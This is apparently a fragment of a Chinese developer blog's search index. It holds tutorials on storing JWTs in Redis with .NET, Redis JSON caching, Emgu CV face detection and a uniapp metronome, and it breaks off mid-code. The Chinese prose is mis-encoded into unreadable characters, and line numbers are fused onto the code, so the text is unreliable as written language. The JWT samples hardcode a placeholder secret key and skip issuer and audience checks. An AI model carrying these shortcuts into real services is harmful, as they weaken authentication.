.size-50{width:50px;height:50px} .size-70{width:70px;height:70px} .flex-wrap-reverse { -ms-flex-wrap: wrap-reverse!important; flex-wrap: wrap-reverse!important } .flex-fill { -ms-flex: 1 1 auto!important; flex: 1 1 auto!important } .flex-grow-0 { -ms-flex-positive: 0!important; flex-grow: 0!important } .flex-grow-1 { -ms-flex-positive: 1!important; flex-grow: 1!important } .flex-shrink-0 { -ms-flex-negative: 0!important; flex-shrink: 0!important } .flex-shrink-1 { -ms-flex-negative: 1!important; flex-shrink: 1!important } .justify-content-start { -ms-flex-pack: start!important; justify-content: flex-start!important } .justify-content-end { -ms-flex-pack: end!important; justify-content: flex-end!important } .justify-content-center { -ms-flex-pack: center!important; justify-content: center!important } .text-gray{color:#555} .overflowClip_1{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:1;-webkit-box-orient:vertical} .overflowClip_1{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block!important} .overflowClip_2{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:2;-webkit-box-orient:vertical} .url-card .url-body{transform:translateY(0px);-webkit-transform:translateY(0px);-moz-transform:translateY(0px);-webkit-transition:all 0.3s ease;-moz-transition:all 0.3s ease;-o-transition:all 0.3s ease;transition:all 0.3s ease} .url-card .url-body:hover{transform:translateY(-6px);-webkit-transform:translateY(-6px);-moz-transform:translateY(-6px);box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-webkit-box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-moz-box-shadow:0 26px 40px -24px rgba(0,36,100,.3)} .url-card .url-like{position:absolute;top:5px;right:10px;opacity:0;transition:opacity .3s} .url-card .url-body:hover .url-like{opacity:1} .url-card .url-info{overflow:hidden;padding-right:5px} .url-card .url-goto-after{height:24px;border-top:1px solid rgba(136,136,136,.2)} .url-card .url-goto{position:absolute;bottom:0;left:0px;right:0} .url-card .card-body{padding:.938rem} .url-card .url-img{width:120px;height:100px;-webkit-box-flex:0;-ms-flex:none;flex:none;background:rgba(255, 255, 255, 0);display:flex;align-items:center;overflow:hidden} .url-card .url-img>img{max-height:100%;vertical-align:unset} .url-card .max .url-img{width:60px;height:60px} .url-card .mini .url-img{width:25px;height:25px} .url-card .post-min .url-img{width:20px;height:20px} .url-card .post-min .url-img>img{vertical-align:unset} .url-card.wechat a.card:after{content:'\\e60d';position:absolute;display:inline-block;font-family:\"iconfont\";font-size:66px;color:#888;margin-left:10px;bottom:-15px;right:10px;opacity:.15} .url-card.down a.card:after{content:'\\e604';position:absolute;display:inline-block;font-family:\"iconfont\";font-size:60px;color:#888;margin-left:10px;bottom:-10px;right:10px;opacity:.15} .url-card.down .mini a.card:after,.url-card.wechat .mini a.card:after{font-size:30px;margin-left:10px;bottom:-5px;right:10px} .url-card.down .max a.card:after,.url-card.wechat .max a.card:after{font-size:30px;bottom:25px} .url-card .mini a.togo,.url-card .default a.togo{position:absolute;top:20px;right:0;width:30px;height:30px;line-height:30px;opacity:.2;transition:opacity .3s} .url-card .mini a.togo{top:4px} .url-card .url-body:hover a.togo{opacity:1} .url-card .max a.togo{margin-left:auto} .url-card .max .tga{width:calc(100% - 15px);overflow:hidden} .url-card .max .tga a{font-size:75%;padding:.125rem .4rem;background:rgba(134,134,134,.1);color:#888;border-radius:10px;transition:.3s} .url-card .max .tga a:not(.no-tag):hover{background:#f1404b;color:#fff} .home-like{cursor:pointer} .home-like:hover{color:#f1404b} .home-like-hide{opacity:0!important;transform:scale(3) translateY(-25px)!important} .url-card a.togo:hover i{text-shadow:0 0 5px} .panel-body .url-card.shortcode-url .card{background:rgba(136,136,136,.1)} .url-card .remove-site,.url-card .remove-cm-site{position:absolute;top:-8px;right:0;font-size:20px;color:#f1404b;line-height:20px} .url-card .mini .card-body{padding:0.4rem 0.5rem} .edit .url-card.sortable{cursor:move} .edit .url-card.sortable .url-body a{pointer-events:none} .edit .url-card.sortable .url-body:hover{transform:initial;box-shadow:initial} .article-entry p, .article-entry table{margin:0} .keep-markdown-body a{ border-bottom: 0rem solid var(--text-color-4);} .mb-4{flex-direction: row-reverse;} .keep-markdown-body img{box-shadow:0 0 0xrem var(--shadow-color)} .post-content-container .border-box{background:#B6E0F9;}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Navigation","slug":"Navigation","permalink":"https://banjinmei.github.io/tags/Navigation/"},{"name":"nav","slug":"nav","permalink":"https://banjinmei.github.io/tags/nav/"}],"author":"mu"},{"title":"jwt redis","slug":"jwt-redis","date":"2024-12-02T17:20:03.000Z","updated":"2024-12-03T18:10:52.214Z","comments":true,"path":"2024/12/03/jwt-redis/","permalink":"https://banjinmei.github.io/2024/12/03/jwt-redis/","excerpt":"","text":"Redis JWTåœ¨ .NET ä¸­ä½¿ç”¨ Redis æ¥å­˜å‚¨ JWTï¼ˆJSON Web Tokenï¼‰å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å®ç°ï¼Œä¾‹å¦‚åœ¨ç”¨æˆ·ç™»å½•æ—¶å°†ç”Ÿæˆçš„ JWT å­˜å‚¨åœ¨ Redis ä¸­ä»¥ä¾¿äºåç»­éªŒè¯å’Œç®¡ç†ã€‚ å®ç°æ­¥éª¤ å¼•å…¥ä¾èµ–ç¡®ä¿ä½ çš„é¡¹ç›®å¼•å…¥äº†ä»¥ä¸‹å¿…è¦çš„ NuGet åŒ…ï¼š Microsoft.AspNetCore.Authentication.JwtBearerï¼šç”¨äº JWT èº«ä»½éªŒè¯ã€‚StackExchange.Redisï¼šç”¨äºä¸ Redis é€šä¿¡ã€‚ 12dotnet add package Microsoft.AspNetCore.Authentication.JwtBearerdotnet add package StackExchange.Redis é…ç½® Redis å®¢æˆ·ç«¯è®¾ç½® Redis çš„è¿æ¥å’Œæ“ä½œã€‚ ç”Ÿæˆ JWTæ ¹æ®ç”¨æˆ·ä¿¡æ¯ç”Ÿæˆ JWT å¹¶å°†å…¶å­˜å‚¨åˆ° Redisã€‚ éªŒè¯ JWTåœ¨éªŒè¯é˜¶æ®µä» Redis æ£€æŸ¥ token æ˜¯å¦æœ‰æ•ˆã€‚ å®ç° Token çš„å¤±æ•ˆæœºåˆ¶åˆ©ç”¨ Redis çš„ TTLï¼ˆè¿‡æœŸæ—¶é—´ï¼‰ç‰¹æ€§æ¥ç®¡ç† token çš„ç”Ÿå‘½å‘¨æœŸã€‚ ä»£ç å®ç°1. é…ç½® Redis å®¢æˆ·ç«¯åœ¨ Program.cs æˆ– Startup.cs ä¸­é…ç½® Redis å’Œ JWT èº«ä»½éªŒè¯ï¼š 1234567891011121314151617181920212223242526272829303132333435using Microsoft.AspNetCore.Authentication.JwtBearer;using Microsoft.Extensions.DependencyInjection;using Microsoft.IdentityModel.Tokens;using StackExchange.Redis;using System.Text;var builder = WebApplication.CreateBuilder(args);// Redis é…ç½®builder.Services.AddSingleton&lt;IConnectionMultiplexer&gt;(sp =&gt; ConnectionMultiplexer.Connect(&quot;localhost:6379&quot;)); // æ›¿æ¢ä¸ºä½ çš„ Redis åœ°å€// JWT é…ç½®var key = &quot;YourSecretKeyForJwt&quot;; // æ›¿æ¢ä¸ºä½ çš„å¯†é’¥builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme) .AddJwtBearer(options =&gt; &#123; options.TokenValidationParameters = new TokenValidationParameters &#123; ValidateIssuerSigningKey = true, IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)), ValidateIssuer = false, ValidateAudience = false &#125;; &#125;);builder.Services.AddAuthorization();var app = builder.Build();app.UseAuthentication();app.UseAuthorization();app.MapControllers();app.Run(); 2. ç”Ÿæˆå’Œå­˜å‚¨ JWTåœ¨ Controller ä¸­ç”Ÿæˆ JWT å¹¶å°†å…¶å­˜å‚¨åˆ° Redisã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344using Microsoft.AspNetCore.Mvc;using Microsoft.IdentityModel.Tokens;using StackExchange.Redis;using System.IdentityModel.Tokens.Jwt;using System.Security.Claims;using System.Text;[ApiController][Route(&quot;api/[controller]&quot;)]public class AuthController : ControllerBase&#123; private readonly IConnectionMultiplexer _redis; private readonly string _jwtKey = &quot;YourSecretKeyForJwt&quot;; // æ›¿æ¢ä¸ºä½ çš„å¯†é’¥ public AuthController(IConnectionMultiplexer redis) &#123; _redis = redis; &#125; [HttpPost(&quot;login&quot;)] public IActionResult Login(string username) &#123; // åˆ›å»º JWT token var claims = new[] &#123; new Claim(ClaimTypes.Name, username) &#125;; var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_jwtKey)); var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256); var token = new JwtSecurityToken( claims: claims, expires: DateTime.UtcNow.AddHours(1), signingCredentials: creds); var jwt = new JwtSecurityTokenHandler().WriteToken(token); // å°† token å­˜å‚¨åˆ° Redis var db = _redis.GetDatabase(); db.StringSet($&quot;jwt:&#123;username&#125;&quot;, jwt, TimeSpan.FromHours(1)); return Ok(new &#123; token = jwt &#125;); &#125;&#125; 3. éªŒè¯ JWTåœ¨ä¸­é—´ä»¶æˆ–éªŒè¯é€»è¾‘ä¸­ä» Redis æ£€æŸ¥ JWT æ˜¯å¦æœ‰æ•ˆã€‚ 123456789101112131415161718[HttpGet(&quot;validate&quot;)]public IActionResult ValidateToken()&#123; var authHeader = Request.Headers[&quot;Authorization&quot;].ToString(); if (string.IsNullOrEmpty(authHeader) || !authHeader.StartsWith(&quot;Bearer &quot;)) return Unauthorized(); var token = authHeader.Replace(&quot;Bearer &quot;, &quot;&quot;); var username = User.Identity?.Name; var db = _redis.GetDatabase(); var storedToken = db.StringGet($&quot;jwt:&#123;username&#125;&quot;); if (storedToken.IsNullOrEmpty || storedToken != token) return Unauthorized(); return Ok(&quot;Token is valid&quot;);&#125; 4. Token å¤±æ•ˆæœºåˆ¶åˆ©ç”¨ Redis çš„ TTL è®¾ç½® token çš„è‡ªåŠ¨è¿‡æœŸï¼š åœ¨å­˜å‚¨ token æ—¶è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚ç”¨æˆ·æ³¨é”€æ—¶å¯ä»¥æ‰‹åŠ¨åˆ é™¤ Redis ä¸­çš„ tokenã€‚æ³¨é”€ç¤ºä¾‹ï¼š 12345678[HttpPost(&quot;logout&quot;)]public IActionResult Logout()&#123; var username = User.Identity?.Name; var db = _redis.GetDatabase(); db.KeyDelete($&quot;jwt:&#123;username&#125;&quot;); return Ok(&quot;Logged out&quot;);&#125; æ€»ç»“é€šè¿‡ Redis å­˜å‚¨ JWTï¼Œå¯ä»¥å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š é›†ä¸­ç®¡ç† JWTï¼šä¾¿äºå®æ—¶æ’¤é”€æˆ–æŸ¥è¯¢ã€‚è‡ªåŠ¨è¿‡æœŸï¼šRedis è‡ªå¸¦ TTLï¼Œå¯ä»¥ç®€åŒ– token çš„ç®¡ç†ã€‚æ‰©å±•æ€§å¥½ï¼šé€‚ç”¨äºåˆ†å¸ƒå¼ç³»ç»Ÿã€‚æ ¹æ®å®é™…éœ€æ±‚ï¼Œè¿˜å¯ä»¥æ‰©å±•åŠŸèƒ½ï¼Œä¾‹å¦‚é»‘åå•æœºåˆ¶æˆ–æ”¯æŒå¤šè®¾å¤‡ç™»å½•ç­‰ã€‚ redisç¼“å­˜json RedisHelperæ–¹æ³•æ·»åŠ  Redis ç¼“å­˜ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰©å±•ä»£ç ï¼š å®ç°æ€è·¯å®šä¹‰ Redis ç¼“å­˜é€»è¾‘ï¼š å…ˆå°è¯•ä» Redis ç¼“å­˜ä¸­è¯»å–æ•°æ®ã€‚å¦‚æœç¼“å­˜å‘½ä¸­ï¼Œåˆ™ç›´æ¥è¿”å›æ•°æ®ã€‚å¦‚æœç¼“å­˜æœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢æ•°æ®åº“ï¼Œå¤„ç†æ•°æ®åå­˜å…¥ Redisï¼Œå¹¶è®¾ç½®é€‚å½“çš„è¿‡æœŸæ—¶é—´ã€‚å®šä¹‰ Redis é”®ï¼š ä½¿ç”¨ä¸€ä¸ªå”¯ä¸€é”®ï¼Œä¾‹å¦‚ **CityInfoList:{id}**ï¼Œç¡®ä¿ç¼“å­˜åŒºåˆ†ä¸åŒ id çš„æ•°æ®ã€‚åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š ä½¿ç”¨ JSON æ ¼å¼å­˜å‚¨æ•°æ®ï¼Œæ–¹ä¾¿è·¨è¯­è¨€å’Œè·¨ç³»ç»Ÿçš„å…¼å®¹æ€§ã€‚æ‰©å±•åçš„ä»£ç ä»¥ä¸‹æ˜¯æ·»åŠ  Redis ç¼“å­˜åçš„å®Œæ•´å®ç°ï¼š 123456789101112131415161718192021222324252627282930313233343536public List&lt;CityInfoS&gt; FindIMCityInfoListByPIDS(string id)&#123; // å®šä¹‰ Redis ç¼“å­˜é”® string redisKey = $&quot;IMCityInfoList:&#123;id&#125;&quot;; // å°è¯•ä» Redis è·å–æ•°æ® string cachedData = RedisHelper.GetString(redisKey); // RedisHelper æ˜¯ Redis æ“ä½œå·¥å…·ç±» if (!string.IsNullOrEmpty(cachedData)) &#123; // å¦‚æœç¼“å­˜å‘½ä¸­ï¼Œååºåˆ—åŒ–å¹¶è¿”å›æ•°æ® return JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(cachedData); &#125; // ç¼“å­˜æœªå‘½ä¸­ï¼Œä»æ•°æ®åº“æŸ¥è¯¢ string sql = @&quot;SELECT `CtId`, `Pid`, `PidS`, `CityCode`, `CityName`, `PostCode`, `AreaCode`, `Ctime`, `CtimeInt`, `LangType`, `HasSon` FROM `IMCityInfoS` WHERE PID = @PID&quot;; var parameters = new MySqlParameter[] &#123; new MySqlParameter(&quot;@PID&quot;, id) &#125;; DataSet ds = DbHelperMySQL.Query(sql, parameters); if (ds != null &amp;&amp; ds.Tables[0].Rows.Count &gt; 0) &#123; // è½¬æ¢æŸ¥è¯¢ç»“æœä¸º JSON string json = JsonConvert.SerializeObject(ds.Tables[0]); // è®¾ç½®ç¼“å­˜å¹¶æŒ‡å®šè¿‡æœŸæ—¶é—´ï¼ˆä¾‹å¦‚30åˆ†é’Ÿï¼‰ RedisHelper.SetString(redisKey, json, TimeSpan.FromMinutes(30)); // ååºåˆ—åŒ–ä¸ºå¯¹è±¡åˆ—è¡¨å¹¶è¿”å› return JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(json); &#125; // å¦‚æœæŸ¥è¯¢æ— ç»“æœï¼Œè¿”å›ç©º return null;&#125; RedisHelper å·¥å…·ç±»å¦‚æœä½ å°šæœªå®ç° RedisHelperï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ç¤ºä¾‹ä»£ç ï¼š 1234567891011121314151617181920using StackExchange.Redis;using System;public static class RedisHelper&#123; private static readonly ConnectionMultiplexer redis = ConnectionMultiplexer.Connect(&quot;localhost&quot;); // æ›¿æ¢ä¸ºä½ çš„ Redis åœ°å€ private static readonly IDatabase db = redis.GetDatabase(); // è·å–å­—ç¬¦ä¸²æ•°æ® public static string GetString(string key) &#123; return db.StringGet(key); &#125; // è®¾ç½®å­—ç¬¦ä¸²æ•°æ®å¹¶æŒ‡å®šè¿‡æœŸæ—¶é—´ public static void SetString(string key, string value, TimeSpan? expiry = null) &#123; db.StringSet(key, value, expiry); &#125;&#125; ä½¿ç”¨æ³¨æ„äº‹é¡¹Redis è¿æ¥æ± ï¼šå®é™…ç”Ÿäº§ä¸­ï¼Œå»ºè®®ä½¿ç”¨ Redis è¿æ¥æ± æ¥ç®¡ç†è¿æ¥ï¼Œé¿å…è¿æ¥è¿‡å¤šå¯¼è‡´èµ„æºå ç”¨ã€‚å¼‚å¸¸å¤„ç†ï¼šåœ¨ Redis è¯»å†™æ“ä½œä¸­ï¼Œæ·»åŠ å¼‚å¸¸æ•è·é€»è¾‘ï¼Œç¡®ä¿å³ä½¿ Redis å‡ºç°é—®é¢˜ï¼Œä¹Ÿä¸ä¼šå½±å“æ•°æ®åº“æŸ¥è¯¢ã€‚è¿‡æœŸæ—¶é—´ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´ï¼Œé¿å…ç¼“å­˜æ•°æ®è¿‡æœŸæˆ–æ— æ•ˆã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"jwt","slug":"jwt","permalink":"https://banjinmei.github.io/tags/jwt/"},{"name":"token","slug":"token","permalink":"https://banjinmei.github.io/tags/token/"},{"name":"redis","slug":"redis","permalink":"https://banjinmei.github.io/tags/redis/"}],"author":"mu"},{"title":"cashrp opencv","slug":"cashrp-opencv","date":"2024-12-02T17:15:38.000Z","updated":"2024-12-02T17:17:14.106Z","comments":true,"path":"2024/12/03/cashrp-opencv/","permalink":"https://banjinmei.github.io/2024/12/03/cashrp-opencv/","excerpt":"","text":"Emgu CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚äººè„¸æ£€æµ‹æ˜¯æŒ‡å®šä½å›¾åƒä¸­çš„äººè„¸ä½ç½®ï¼Œè€Œäººè„¸è¯†åˆ«æ˜¯æŒ‡ç¡®è®¤æˆ–éªŒè¯è¿™äº›è„¸å­”çš„èº«ä»½ã€‚ä¸ºäº†å®ç°äººè„¸è¯†åˆ«ï¼Œéœ€è¦è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼Œæˆ–è€…ä½¿ç”¨é¢„è®­ç»ƒçš„æ¨¡å‹ã€‚ å®‰è£… Emgu CVé¦–å…ˆï¼Œéœ€è¦é€šè¿‡NuGetå®‰è£…Emgu CVåŒ…ã€‚å¯ä»¥é€šè¿‡Visual Studioçš„NuGetåŒ…ç®¡ç†å™¨æ¥å®‰è£…ï¼š æ‰“å¼€çš„C#é¡¹ç›®ã€‚å³é”®ç‚¹å‡»è§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨ä¸­çš„é¡¹ç›®åç§°ï¼Œé€‰æ‹©â€œç®¡ç†NuGetç¨‹åºåŒ…â€ã€‚ æœç´¢å¹¶å®‰è£…Emgu.CVå’ŒEmgu.CV.runtime.windowsã€‚12345678910111213141516171819202122// åŠ è½½äººè„¸æ£€æµ‹åˆ†ç±»å™¨CascadeClassifier faceCascade = new CascadeClassifier(&quot;haarcascade_frontalface_default.xml&quot;);// è¯»å–è¾“å…¥å›¾åƒImage&lt;Bgr, byte&gt; inputImage = new Image&lt;Bgr, byte&gt;(&quot;face.jpg&quot;);// è½¬æ¢ä¸ºç°åº¦å›¾åƒï¼Œå› ä¸ºäººè„¸æ£€æµ‹é€šå¸¸åœ¨ç°åº¦å›¾åƒä¸Šè¿›è¡ŒImage&lt;Gray, byte&gt; grayImage = inputImage.Convert&lt;Gray, byte&gt;();// è¿›è¡Œäººè„¸æ£€æµ‹Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty);// åœ¨æ£€æµ‹åˆ°çš„äººè„¸å‘¨å›´ç»˜åˆ¶çŸ©å½¢æ¡†foreach (Rectangle face in faces)&#123; inputImage.Draw(face, new Bgr(0, 255, 0), 3);&#125;// ä¿å­˜æ ‡è®°åçš„å›¾åƒä¸ºoutput.jpginputImage.Save(&quot;output.jpg&quot;); Console.WriteLine(&quot;save~output.jpg&quot;); xmlæ¥è‡ª https://github.com/opencv/opencv/tree/master/data/haarcascades runtimeå¦‚æœæ²¡æœ‰ Emgu.CV.runtime.windows åˆ™ä¼šåŠ è½½ä¸äº†xml Exception ï¼šSystem.TypeInitializationException:â€œThe type initializer for â€˜Emgu.CV.CvInvokeâ€™ threw an exception.â€ æ£€æŸ¥è¿è¡Œæ—¶ä¾èµ– (opencv_world*.dll) æ˜¯å¦åŠ è½½æ­£ç¡®ã€‚å®‰è£…æœ€æ–°çš„ VC++ Redistributableã€‚ç¡®ä¿é¡¹ç›®ç›®æ ‡å¹³å°ä¸ Emgu.CV çš„ä¾èµ–é¡¹ä¸€è‡´ã€‚ è¯†åˆ«çŒ«è„¸1234567891011121314151617181920212223// åŠ è½½æ£€æµ‹åˆ†ç±»å™¨CascadeClassifier faceCascade = new CascadeClassifier(&quot;haarcascade_frontalcatface.xml&quot;);// è¯»å–è¾“å…¥å›¾åƒImage&lt;Bgr, byte&gt; inputImage = new Image&lt;Bgr, byte&gt;(&quot;cat2.jpg&quot;);// è½¬æ¢ä¸ºç°åº¦å›¾åƒï¼Œå› ä¸ºäººè„¸æ£€æµ‹é€šå¸¸åœ¨ç°åº¦å›¾åƒä¸Šè¿›è¡ŒImage&lt;Gray, byte&gt; grayImage = inputImage.Convert&lt;Gray, byte&gt;();// è¿›è¡Œäººè„¸æ£€æµ‹Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty);// åœ¨æ£€æµ‹åˆ°çš„äººè„¸å‘¨å›´ç»˜åˆ¶çŸ©å½¢æ¡†foreach (Rectangle face in faces)&#123; inputImage.Draw(face, new Bgr(0, 255, 0), 3);&#125;// ä¿å­˜æ ‡è®°åçš„å›¾åƒä¸ºoutput.jpginputImage.Save(&quot;output.jpg&quot;);Console.WriteLine(&quot;save~output.jpg&quot;);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"csharp","slug":"csharp","permalink":"https://banjinmei.github.io/tags/csharp/"},{"name":"opencv","slug":"opencv","permalink":"https://banjinmei.github.io/tags/opencv/"},{"name":"emgu","slug":"emgu","permalink":"https://banjinmei.github.io/tags/emgu/"}],"author":"mu"},{"title":"uniapp èŠ‚æ‹å™¨","slug":"uniapp-èŠ‚æ‹å™¨","date":"2024-12-02T17:12:19.000Z","updated":"2024-12-02T17:15:14.529Z","comments":true,"path":"2024/12/03/uniapp-èŠ‚æ‹å™¨/","permalink":"https://banjinmei.github.io/2024/12/03/uniapp-%E8%8A%82%E6%8B%8D%E5%99%A8/","excerpt":"","text":"èŠ‚æ‹å™¨åŸºç¡€åŠŸèƒ½åŠ é€Ÿ å‰é€Ÿ å¯åŠ¨ æš‚åœ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- èŠ‚æ‹æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;èŠ‚æ‹ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat &#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- æ»‘å—å®šä¹‰èŠ‚æ‹æ•° --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; @change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- é€Ÿåº¦æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;é€Ÿåº¦ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- å¢åŠ é€Ÿåº¦æŒ‰é’® --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot;&gt;åŠ é€Ÿ&lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot;&gt;å‡é€Ÿ&lt;/button&gt; &lt;/view&gt; &lt;!-- æ’­æ”¾/åœæ­¢æŒ‰é’® --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;åœæ­¢&#x27; : &#x27;æ’­æ”¾&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // åˆå§‹èŠ‚æ‹æ•° speed: 60, // åˆå§‹é€Ÿåº¦ï¼ˆæ¯åˆ†é’ŸèŠ‚æ‹æ•°ï¼‰ playStatus: &#x27;stopped&#x27;, // æ’­æ”¾çŠ¶æ€ï¼Œåˆå§‹ä¸ºåœæ­¢ intervalId: null, // ç”¨äºå­˜å‚¨å®šæ—¶å™¨ID audioContext: null, // éŸ³é¢‘ä¸Šä¸‹æ–‡ &#125;; &#125;, methods: &#123; // åˆå§‹åŒ–éŸ³é¢‘ä¸Šä¸‹æ–‡ initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); this.audioContext.src = &#x27;/static/sounds/a1.mp3&#x27;; // æ›¿æ¢ä¸ºèŠ‚æ‹éŸ³æ•ˆæ–‡ä»¶è·¯å¾„ this.audioContext.volume = 1.0; &#125; &#125;, // å¤„ç†æ»‘å—æ”¹å˜èŠ‚æ‹æ•°çš„äº‹ä»¶ handleBeatChange(event) &#123; this.beat = event.detail.value; &#125;, // å¢åŠ é€Ÿåº¦çš„æ–¹æ³• increaseSpeed() &#123; this.speed += 10; &#125;, // å‡å°‘é€Ÿåº¦çš„æ–¹æ³• decreaseSpeed() &#123; this.speed -= 10; if (this.speed &lt; 10) &#123; this.speed = 10; &#125; &#125;, // åˆ‡æ¢æ’­æ”¾/åœæ­¢çŠ¶æ€çš„æ–¹æ³• togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // å¯åŠ¨èŠ‚æ‹å™¨çš„æ–¹æ³•ï¼Œé€šè¿‡å®šæ—¶å™¨æ’­æ”¾å£°éŸ³ startMetronome() &#123; const intervalTime = 60000 / this.speed; // æ ¹æ®é€Ÿåº¦è®¡ç®—æ¯ä¸ªèŠ‚æ‹çš„é—´éš”æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ this.intervalId = setInterval(() =&gt; &#123; this.audioContext.play(); // æ’­æ”¾éŸ³æ•ˆ &#125;, intervalTime); &#125;, // åœæ­¢èŠ‚æ‹å™¨çš„æ–¹æ³• stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; this.audioContext.stop(); // åœæ­¢éŸ³æ•ˆ &#125;, &#125;, onUnload() &#123; // é¡µé¢å¸è½½æ—¶æ¸…ç†éŸ³é¢‘èµ„æº if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt; å¤„ç†éŸ³é¢‘æ–‡ä»¶ a1 a2https://audiotrimmer.com/cn/ å®æ—¶æ›´æ–°èŠ‚æ‹éŸ³æ•ˆï¼šæ»‘åŠ¨æ»‘å— (handleBeatChange) æˆ–ç‚¹å‡»æŒ‰é’® (increaseSpeed&#x2F;decreaseSpeed) æ—¶ï¼Œä¼šç«‹å³è°ƒç”¨ restartMetronomeï¼Œåœæ­¢å½“å‰èŠ‚æ‹å™¨å¹¶é‡æ–°å¯åŠ¨ã€‚å½“æ’­æ”¾çŠ¶æ€ä¸º stopped æ—¶ï¼Œä»…æ’­æ”¾ä¸€æ¬¡èŠ‚æ‹éŸ³æ•ˆä»¥ä¾¿å³æ—¶åé¦ˆã€‚æ–°å¢ restartMetronome æ–¹æ³•ï¼š åœæ­¢å½“å‰èŠ‚æ‹å™¨åï¼Œé‡æ–°å¯åŠ¨ï¼Œä»¥å®ç°åŠ¨æ€è°ƒæ•´é€Ÿåº¦å’ŒèŠ‚æ‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- èŠ‚æ‹æ˜¾ç¤º --&gt; &lt;view class=&quot;label&quot;&gt;èŠ‚æ‹ï¼š&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat &#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- æ»‘å—å®šä¹‰èŠ‚æ‹æ•° --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; 